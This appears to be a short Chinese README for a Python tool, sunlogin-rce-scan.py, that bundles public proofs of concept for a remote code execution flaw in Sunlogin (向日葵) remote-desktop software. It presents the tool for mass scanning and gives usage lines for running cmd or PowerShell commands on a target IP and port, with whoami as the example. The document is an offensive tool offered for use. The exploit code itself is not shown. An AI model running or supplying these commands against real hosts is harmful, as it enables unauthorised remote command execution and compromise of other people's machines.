# 向日葵批量扫描利用工具

集成了已开放的poc 可进行批量扫描或命令执行

批量扫描

```
py -3 sunlogin-rce-scan.py 
```

cmd命令执行

```
py -3 sunlogin-rce-scan.py -a 22.22.2.13 -p 56227 -c whoami
```

powershell命令执行

```
py -3 sunlogin-rce-scan.py -a 22.22.2.13 -p 56227 -s whoami
```


